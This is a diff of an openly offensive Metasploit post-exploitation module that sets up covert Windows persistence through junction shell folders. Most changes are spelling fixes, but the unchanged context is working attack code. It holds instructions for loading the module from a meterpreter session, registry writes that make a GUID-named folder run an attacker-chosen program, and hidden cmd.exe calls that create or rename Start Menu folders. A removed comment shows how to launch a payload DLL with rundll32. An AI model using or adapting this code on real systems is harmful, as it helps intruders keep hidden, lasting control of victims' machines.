@@ -7,7 +7,7 @@
 
 
 ##
-# Exploit Title  : juntion_shell_folders_persistence.rb
+# Exploit Title  : junction_shell_folders_persistence.rb
 # Module Author  : pedr0 Ubuntu [r00t-3xp10it]
 # Vuln discover  : vault7 | wikileaks | nsa
 # Tested on      : Windows 2008 | Windows 7 | Windows 10
@@ -32,26 +32,26 @@
 # ----------------------------------------------------------------------------------------------------
 # WARNING: 'PERSIST_EXPLORER' and 'RENAME_PERSIST' technics were tested using one payload.DLL and
 # 'RENAME_PERSIST' option will rename %AppData%\\microsoft\\windows\\Start Menu\\Programs\\Accessories
-# to: %AppData%\\microsoft\\windows\\Start Menu\\Programs\\Accessories.{GUID} <--juntion folder
+# to: %AppData%\\microsoft\\windows\\Start Menu\\Programs\\Accessories.{GUID} <--junction folder
 # ----------------------------------------------------------------------------------------------------
 #
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
-# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/escalate/juntion_shell_folders_persistence.rb
-# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/escalate/juntion_shell_folders_persistence.rb
+# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/escalate/junction_shell_folders_persistence.rb
+# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/escalate/junction_shell_folders_persistence.rb
 # Manually Path Search: root@kali:~# locate modules/post/windows/escalate
 #
 #
 # [ LOAD/USE AUXILIARY ]
 # meterpreter > background
 # msf exploit(handler) > reload_all
-# msf exploit(handler) > use post/windows/escalate/juntion_shell_folders_persistence
-# msf post(juntion_shell_folders_persistence) > info
-# msf post(juntion_shell_folders_persistence) > show options
-# msf post(juntion_shell_folders_persistence) > show advanced options
-# msf post(juntion_shell_folders_persistence) > set [option(s)]
-# msf post(juntion_shell_folders_persistence) > exploit
+# msf exploit(handler) > use post/windows/escalate/junction_shell_folders_persistence
+# msf post(junction_shell_folders_persistence) > info
+# msf post(junction_shell_folders_persistence) > show options
+# msf post(junction_shell_folders_persistence) > show advanced options
+# msf post(junction_shell_folders_persistence) > set [option(s)]
+# msf post(junction_shell_folders_persistence) > exploit
 #
 # [ HINT ]
 # In some linux distributions postgresql needs to be started and
@@ -163,10 +163,10 @@ def run
   #
   # MODULE BANNER
   #
-  print_line("    +-----------------------------------------------+")
-  print_line("    | Juntion Shell Folders (User-Land Persistence) |")
-  print_line("    |           Author : r00t-3xp10it (SSA)         |")
-  print_line("    +-----------------------------------------------+")
+  print_line("    +------------------------------------------------+")
+  print_line("    | junction Shell Folders (User-Land Persistence) |")
+  print_line("    |           Author : r00t-3xp10it (SSA)          |")
+  print_line("    +------------------------------------------------+")
   print_line("")
   print_line("    Running on session  : #{datastore['SESSION']}")
   print_line("    Computer            : #{sysnfo['Computer']}")
@@ -210,10 +210,10 @@ def run
   #
   if datastore['APPL_PATH'] == 'nil' || datastore['FOLDER_PATH'] == 'nil'
     print_error("Options not configurated correctly ..")
-    print_warning("Please set APP_PATH | FOLDER_PATH!")
+    print_warning("Please set APPL_PATH | FOLDER_PATH!")
     return nil
   else
-    print_status("Juntion shell folders (vault7 - nsa)!")
+    print_status("junction shell folders (vault7 - nsa)!")
     Rex::sleep(1.5)
   end
 
@@ -286,8 +286,7 @@ def run
        ]
      else
        #
-       # This option [DEMO] can still be configurated to launch an payload.dll
-       # for that we just need to input: set APPL_PATH rundll32 %tmp%\\payload.dll,main ;)
+       # DEMO mode (user inputs)
        #
        hacks = [
         '#{hive_key}\\#{new_GUID}\\Shell\\Manage\\Command /ve /t REG_SZ /d \"#{app_path}\"" /f'
@@ -313,25 +312,25 @@ def run
 
 
          #
-         # build POC folder (juntion shell folders)
+         # build POC folder (junction shell folders)
          #
          r=''
          if datastore['PERSIST_EXPLORER'] == true
            folder_poc ="\"#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\POC\""
-           print_status("Creating juntion shell folder ..")
+           print_status("Creating junction shell folder ..")
            Rex::sleep(1.0)
            r = session.sys.process.execute("cmd.exe /R mkdir #{folder_poc}.#{new_GUID}", nil, {'Hidden' => true, 'Channelized' => true})
            r.channel.close
            r.close
          elsif datastore['RENAME_PERSIST'] == true
            ren_per = "\"#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\""
-           print_status("Creating juntion shell folder ..")
+           print_status("Creating junction shell folder ..")
            Rex::sleep(1.0)
         r = session.sys.process.execute("cmd.exe /R rename #{ren_per} #{ren_per}.{new_GUID}", nil, {'Hidden' => true, 'Channelized' => true})
            r.channel.close
            r.close
          else
-           print_status("Creating juntion shell folder ..")
+           print_status("Creating junction shell folder ..")
            Rex::sleep(1.0)
            r = session.sys.process.execute("cmd.exe /R mkdir \"#{fol_path}.#{new_GUID}\"", nil, {'Hidden' => true, 'Channelized' => true})
            r.channel.close
